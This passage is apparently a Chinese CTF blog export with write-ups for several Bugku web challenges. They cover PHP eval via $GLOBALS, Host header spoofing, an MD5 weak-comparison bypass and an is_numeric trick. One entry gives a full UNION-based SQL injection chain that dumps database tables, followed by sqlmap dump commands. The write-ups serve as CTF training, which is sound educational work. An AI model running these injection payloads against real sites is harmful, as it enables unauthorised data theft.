class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析了一下，应该是要满足什么条件才能获取flag。</p>
<h2 id="探寻真理"><a href="#探寻真理" class="headerlink" title="探寻真理"></a>探寻真理</h2><p>习惯性的多发送几次发现每次的img路径都不同，这就有意思了（会变的肯定是可疑的）</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/2.png" class="">

<p>既然图片来源的命名规则是数字，那么扔进intruder中跑一下看看效果</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/3.png" class="">

<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/4.png" class="">

<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/5.png" class="">

<p>发现只有10.jpg状态码是200，特殊的肯定有说法。</p>
<p>通过repeater不断地重新发包(也可以通过intruder，个人感觉应该不会发送太多次)</p>
<p>Tips：因为img路径需要向下滑动才能看到，比较麻烦，所以在搜索结果上加一个匹配可以快速看到是否有结果</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/6.png" class="">

<p>成功捕获，康康</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/7.png" class="">

<p>flag果然在这，作者诚不欺我</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>截图的时候我还疑惑这图片怎么时有时无的，开始我还以为是网络问题，现在看来还是当时太年轻啊</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>变量1</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%8F%98%E9%87%8F1/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%8F%98%E9%87%8F1/1.png" class="">

<p>源码审计</p>
<a id="more"></a>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>; <span class="comment">// 文件包含</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); <span class="comment">// 显示本文件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment">// 判断args参数是否存在</span></span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>]; <span class="comment">// 提取args参数</span></span><br><span class="line">    <span class="comment">// \w 匹配字母或数字或下划线或汉字 等价于 &#x27;[^A-Za-z0-9_]&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args)) &#123; <span class="comment">// 正则匹配，只能包含数字、字母、下划线</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行$$agrs</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($$args);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结：如果args参数只有数字、字母和下划线时以代码执行</p>
<p>由于不能存在空格之类的特殊字符，所以flag1文件中应该是定义了全局变量（页面中提示我们flag in variable）</p>
<h2 id="寻找真相"><a href="#寻找真相" class="headerlink" title="寻找真相"></a>寻找真相</h2><p>PHP中预定义了一组超变量，其中就有一个$GLOBALS存储了系统全局变量，可以尝试读取此变量的值</p>
<p>更多信息参考：<a href="https://www.php.net/manual/zh/language.variables.superglobals.php" alt="PHP超变量" target="_blank">传送门</a></p>
<p>同时可以看到源码中使用了两次引用，所以最终payload为：GLOBALS</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%8F%98%E9%87%8F1/3.png" class="">

<p>Note：PHP的$符号类似于指针引用并且做了加强，很是方便并且灵活性也很高</p>
<h2 id="面壁思过"><a href="#面壁思过" class="headerlink" title="面壁思过"></a>面壁思过</h2><p>在写这篇博文时，尝试payload却总是失败，放出图片你们帮我看看是为什么</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%8F%98%E9%87%8F1/2.png" class="">

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识无小事，基础很重要</p>
<p>温故而知新，才能更长远</p>
<p>好高又骛远，到头一场空</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>域名解析</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/1.png" class="">

<p>这。。想改baidu的DNS解析不现实了，只能改本地的了</p>
<a id="more"></a>

<h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>HOST文件介绍：<a href="https://wenku.baidu.com/view/9a14c43510661ed9ad51f33b.html" alt="HOST文件介绍" target="_blank">传送门</a></p>
<p>总结就是一句话：以文件形式存储的DNS记录集</p>
<p>知道了host文件的原理之后，我们直接修改Host文件（如果提示无法修改等权限问题看最后）</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/2.png" class="">

<p>访问flag.baidu.com</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/3.png" class="">

<p>YES，成功拿下</p>
<h2 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h2><p>除了修改host这种改变DNS解析结果的方式，还有木有别的方法呢？当然有</p>
<p>首先说一下一次HTTP的过程：</p>
<ol>
<li>客户机发起DNS请求</li>
<li>DNS服务器将域名对应的IP发送回客户机</li>
<li>客户机向指定IP的服务器发起HTTP请求</li>
<li>WEB服务器返回数据</li>
</ol>
<p>有没有意识到什么？</p>
<p>对，修改DNS只是告诉了电脑该向谁发送数据，我们可以直接告诉电脑发送的目标</p>
<p>目标服务器IP：123.206.87.240</p>
<p>先正常访问并抓包：</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/4.png" class="">

<p>可以看到，直接访问会返回400</p>
<p>了解WEB开发的小伙伴这时候肯定想到了，WEB服务器是根据什么判断不同站点的</p>
<p>所以嘛，将host字段修改为：flag.baidu.com后重新发送</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/5.png" class="">

<p>YES，拿下flag，估计小伙伴们会产生以下疑惑：</p>
<ol>
<li>为什么目标不改成flag.baidu.com</li>
<li>为什么修改了host字段就可以了</li>
</ol>
<p>这里面涉及到一些WEB中间件知识，希望好好研究一下，如果有困难可以联系我</p>
<h2 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h2><p>上面说了修改host文件可能存在权限不够的问题，这里给出两种解决方案</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>找到host文件–&gt;右键–&gt;属性–&gt;安全–&gt;编辑</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/6.png" class="">

<p>然后把当前用户的权限全部勾选</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/7.png" class="">

<br>

<p>—–&gt;或者直接使用vs code编辑（博主使用的方法）</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li>以超级用户身份操作：sudo vim /etc/hosts</li>
<li>改变文件的属主：sudo chown user:root /etc/hosts（user代表新属主）</li>
</ul>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li><p>道路千万条，目标就一个</p>
</li>
<li><p>不要被任何人的WP束缚自己的思路</p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>备份是个好习惯</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/1.png" class="">

<p>题干提示我们可能存在备份文件</p>
<a id="more"></a>

<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/2.png" class="">

<h2 id="开始探索"><a href="#开始探索" class="headerlink" title="开始探索"></a>开始探索</h2><p>主页面有一串天文数字，仔细一看是两个相同数据重叠了，提取出来扔到<a href="https://cmd5.com" alt="CMD5" target="_blank">cmd5</a>上跑一下看看</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/3.png" class="">

<p>貌似没什么用，还是扫描一下备份文件吧</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/4.png" class="">

<p>NICE，成功扫描到了index.php.bak，访问一下</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/5.png" class="">

<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取GET参数</span></span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除GET参数中的key字符串，使用双写key绕过</span></span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把字符串解析到变量中</span></span><br><span class="line">parse_str($str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印参数值</span></span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重头戏：还记得矛盾那道题吗？这个是新的&quot;矛盾&quot;，如果两个数不一样但MD5一样即可输出flag</span></span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结就是找到两个数值不同但MD5相同的数，根据MD5的文档可知，两个不同字符串MD5相同的概率低到直接忽略不计（ 1/(10E28) ），这条路堵死了。</p>
<h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>就在此时突然发现了一个细节</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/6.png" class="">

<p>MD5值比较用的弱等于，而两个key值之间的比较用的强等于，也就是说比较MD5这里大有文章可做</p>
<p>果不其然，经过了谷歌探索之后，发现可以使用科学计数法进行绕过</p>
<p>原理：0的任何次幂都是0，用科学计数法表示就是0e后面接任何数字</p>
<p>列举出几个MD5值前两位是0e的：</p>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
</ul>
<p>&emsp;&emsp;同时在查询资料时还发现MD5无法计算数组，对于数组的计算结果总是为NULL，使用此特性也可以达到不同数值但MD5值相同的效果</p>
<h2 id="迈向未来"><a href="#迈向未来" class="headerlink" title="迈向未来"></a>迈向未来</h2><p>经过上述知识铺垫，最终的payload方案如下：</p>
<ol>
<li>kkeyey1=QNKCDZO&amp;kkeyey2=240610708    使用科学计数法</li>
<li>kkeyey1[]=somthing&amp;kkeyey2[]=anything     使用数组</li>
</ol>
<p>本次演示采用第二种方案(因为数组计算的MD5为NULL不会显示在页面上造成干扰)</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/7.png" class="">

<p>得到了想要的答案，NICE</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>谷歌大法好</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>头等舱</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%B4%E7%AD%89%E8%88%B1/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%B4%E7%AD%89%E8%88%B1/1.png" class="">

<a id="more"></a>

<p>什么都没有？我差亿点就信了</p>
<h2 id="打破谎言"><a href="#打破谎言" class="headerlink" title="打破谎言"></a>打破谎言</h2><p>对于这种此地无银三百两的说法我当然要打破它，看看源码先</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%B4%E7%AD%89%E8%88%B1/2.png" class="">

<p>果然不出所料，还想骗我。这波是骗人不成反交flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>绝对不要相信作者的鬼话</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>成绩单</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/1.png" class="">

<p>查成绩真是人生中最刺激最惊险的事</p>
<a id="more"></a>

<h2 id="查看分数"><a href="#查看分数" class="headerlink" title="查看分数"></a>查看分数</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/2.png" class="">

<p>占位提示我们输入1、2、3，先信了他试一试</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/3.png" class="">

<p>输入1、2、3都有数据返回，其余数据无返回结果，像极了SQL注入</p>
<h2 id="开始尝试"><a href="#开始尝试" class="headerlink" title="开始尝试"></a>开始尝试</h2><h3 id="知己知彼：猜测SQL"><a href="#知己知彼：猜测SQL" class="headerlink" title="知己知彼：猜测SQL"></a>知己知彼：猜测SQL</h3><p>根据源码猜测是根据ID匹配信息的，这就跟sqlilabs很像了啊，放心大胆地猜测SQL为：</p>
<p>SELECT math,english,chinese FROM table WHERE id=number;</p>
<h3 id="第一步：判断闭合方式"><a href="#第一步：判断闭合方式" class="headerlink" title="第一步：判断闭合方式"></a>第一步：判断闭合方式</h3><p>payload：1’and’1 发现正确回显，判定单引号闭合几率高达90%</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/4.png" class="">

<h3 id="第二步：判断返回的字段数"><a href="#第二步：判断返回的字段数" class="headerlink" title="第二步：判断返回的字段数"></a>第二步：判断返回的字段数</h3><p>payload：0’ORDER+BY+4–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/5.png" class="">

<p>经过尝试发现1、2、3、4均正确而5错误说明返回4个字段</p>
<p>其实还可以靠分析和经验，页面中返回的信息有姓名和三科成绩，故最少返回4个数据(作者不坑人的情况下)，直接从4开始尝试即可</p>
<h3 id="第三步：判断哪些字段回显在页面上"><a href="#第三步：判断哪些字段回显在页面上" class="headerlink" title="第三步：判断哪些字段回显在页面上"></a>第三步：判断哪些字段回显在页面上</h3><p>payload：0’UNION+SELECT+1,2,3,4–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/6.png" class="">

<p><strong>说明一下：既然知道了数据库返回4个字段并且和页面一一对应那为什么还要进行这步判断呢？岂不是多此一举？其实是想强调一下注入过程和思路，以后遇到返回字段数和页面显示不匹配的情况也不慌，同时还可以确定每个字段在页面的位置(很重要)</strong></p>
<h3 id="第四步：获取数据库信息"><a href="#第四步：获取数据库信息" class="headerlink" title="第四步：获取数据库信息"></a>第四步：获取数据库信息</h3><p>payload：0’UNION+SELECT+database(),user(),version(),4–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/7.png" class="">

<p>确定DBMS是MySQL5.5.34，同时当前使用的数据库是skctf_flag</p>
<p><strong>注意：这步是确定当前信息的正确性，部分语法相似的数据库容易误判</strong></p>
<h3 id="第五步：获取所有数据库"><a href="#第五步：获取所有数据库" class="headerlink" title="第五步：获取所有数据库"></a>第五步：获取所有数据库</h3><p>payload：0’UNION+SELECT+database(),group_concat(SCHEMA_NAME),version(),4+FROM+information_schema.schemata–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/8.png" class="">

<p>显而易见，使用了每系统每用户，权限最小化，也确定了flag就在当前使用的数据库中(不在的几率低的忽略不计，但不排除，先看看)</p>
<h3 id="第六步：获取skctf-flag数据库中所有的表"><a href="#第六步：获取skctf-flag数据库中所有的表" class="headerlink" title="第六步：获取skctf_flag数据库中所有的表"></a>第六步：获取skctf_flag数据库中所有的表</h3><p>payload：0’UNION+SELECT+database(),group_concat(table_name),version(),4+FROM+information_schema.tables+WHERE+table_schema=’skctf_flag’–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/9.png" class="">

<p>skctf_flag数据库中的表：fl4g、sc</p>
<p>fl4g表比较可疑，先看</p>
<h3 id="第七步：获取fl4g表中所有的字段"><a href="#第七步：获取fl4g表中所有的字段" class="headerlink" title="第七步：获取fl4g表中所有的字段"></a>第七步：获取fl4g表中所有的字段</h3><p>payload：0’UNION+SELECT+database(),group_concat(column_name),version(),4+FROM+information_schema.columns+WHERE+table_schema=’skctf_flag’+AND+table_name=’fl4g’–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/10.png" class="">

<p>fl4g表中的字段：skctf_flag</p>
<h3 id="第八步：提取所有行数据"><a href="#第八步：提取所有行数据" class="headerlink" title="第八步：提取所有行数据"></a>第八步：提取所有行数据</h3><p>payload：0’UNION+SELECT+database(),group_concat(table_name),version(),4+FROM+information_schema.tables+WHERE+table_schema=’skctf_flag’–+-</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/11.png" class="">

<p>历经千辛万苦终于拿下flag，测试无误，另外一个表肯定就是成绩单了，不看了</p>
<h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>前面讲的都是手工测试，接下来带你们玩自动化工具sqlmap</p>
<p><strong>注意：本人的sqlmap配置了fastkey可以全局使用，你们就不一定了</strong></p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>由于是POST请求，需要准备一个数据包</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/12.png" class="">

<p>本人保存为target.txt，名称随意</p>
<h3 id="第一步：探测所有数据库"><a href="#第一步：探测所有数据库" class="headerlink" title="第一步：探测所有数据库"></a>第一步：探测所有数据库</h3><p>命令：sqlmap -r target.txt –dbs –batch</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/13.png" class="">

<h3 id="第二步：探测skctf-flag库中所有的表"><a href="#第二步：探测skctf-flag库中所有的表" class="headerlink" title="第二步：探测skctf_flag库中所有的表"></a>第二步：探测skctf_flag库中所有的表</h3><p>命令：sqlmap -r target.txt -D skctf_flag –tables –batch</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/14.png" class="">

<h3 id="第三步：探测fl4g表中所有的字段"><a href="#第三步：探测fl4g表中所有的字段" class="headerlink" title="第三步：探测fl4g表中所有的字段"></a>第三步：探测fl4g表中所有的字段</h3><p>命令：sqlmap -r target.txt -D skctf_flag -T fl4g –columns –batch</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/15.png" class="">

<h3 id="第四步：提取行数据"><a href="#第四步：提取行数据" class="headerlink" title="第四步：提取行数据"></a>第四步：提取行数据</h3><p>命令：sqlmap -r target.txt -D skctf_flag -T fl4g -C skctf_flag –dump –batch</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%88%90%E7%BB%A9%E5%8D%95/16.png" class="">

<p>拿下，简单不？但是工具是辅助注入的，不可盲目依赖</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>工具是提升效率的，前提是你已经掌握了技术</p>
<p>再好的工具你不会远离也无法发挥其威力</p>
<h2 id="课后问答FAQ"><a href="#课后问答FAQ" class="headerlink" title="课后问答FAQ"></a>课后问答FAQ</h2><p>Q：为什么有时候id用1，有时候却用0呢？</p>
<p>A：看当前操作是否需要正确的查询数据，比如构造联合查询就必须给一个不存在的ID否则自定义的数据将永不见天日</p>
<br>

<p>Q：为什么查询的字段要用group_concat函数</p>
<p>A：因为单词查询只会返回一条结果，为了将多个结果在同一次查询中返回</p>
<br>

<p>Q：为什么不先写SQLMAP</p>
<p>A：有简易方式你还会去尝试困难的吗？</p>
<br>

<p>Q：其他问题</p>
<p>A：懒得打字了，发邮箱或者加企鹅私聊吧</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>矛盾</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%9F%9B%E7%9B%BE/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%9F%9B%E7%9B%BE/1.png" class="">

<p>代码审计题</p>
<a id="more"></a>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>]; <span class="comment">// 从GET参数中提取num</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num)) <span class="comment">// 如果num不是一个数字</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $num; <span class="comment">// 输出num的值</span></span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">1</span>) <span class="comment">// 如果num值弱等于1则输出flag</span></span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：提交一个名为num的GET参数，如果他不是一个数字但是值又弱等于1则输出flag</p>
<p>行吧，终于明白标题的含义了</p>
<h2 id="探索真相"><a href="#探索真相" class="headerlink" title="探索真相"></a>探索真相</h2><p>本题中能有暗箱操作的地方只有is_numeric函数和弱等于了</p>
<p>先看看is_numeric函数：函数用于检测变量是否为数字或数字字符串</p>
<p>详细说明参考：<a href="https://www.php.net/manual/zh/function.is-numeric.php " alt="官方" target="_blank">PHP官方</a>，<a href="https://www.runoob.com/php/php-is_numeric-function.html " alt="菜鸟教程" target="_blank">菜鸟教程</a></p>
<p>也就是说只要字符串中存在非数字字符即返回false</p>
<br>

<p>那么现在的问题就变成了如何在数字字符串中中包含非数字字符，嗯……………….</p>
<p>有了，科学计数法中用e表示10，可能有戏</p>
<p>不清楚的同学先看看这个：<a href="https://baike.baidu.com/item/%E7%A7%91%E5%AD%A6%E8%AE%B0%E6%95%B0%E6%B3%95/1612882?fromtitle=%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95&fromid=756685&fr=aladdin" alt="科学计数法" target="_blank">科学计数法</a>，<a href="https://www.jianshu.com/p/697d3aa68ad3" alt="PHP科学计数法" target="">PHP科学计数法</a></p>
<p>由于任何数的零次幂都为1，所以我们可以使用<strong>1e0</strong>表示1</p>
<h2 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%9F%9B%E7%9B%BE/2.png" class="">

<p>嗯？？为什么不行，这脸打得啪啪的</p>
<p>而且是完全不行，连第一道关卡都没过得去</p>
<h2 id="深刻反思"><a href="#深刻反思" class="headerlink" title="深刻反思"></a>深刻反思</h2><p>科学计数法应该没问题啊。为什么会出现这种情况</p>
<p>既然自己不行事，找找别人的参考一下下</p>
<p>翻遍了WP，发现都是说的科学计数法，但是和我想的有一个明显的区别：</p>
<p>别人的payload：1*e*0.1</p>
<p>我的payload：1e0</p>
<p>这就很奇怪了，首先他这表达式就不是科学计数法，其次科学计数法幂数哪来的小数？？？？？</p>
<p>先试试人家的吧，康康情况</p>
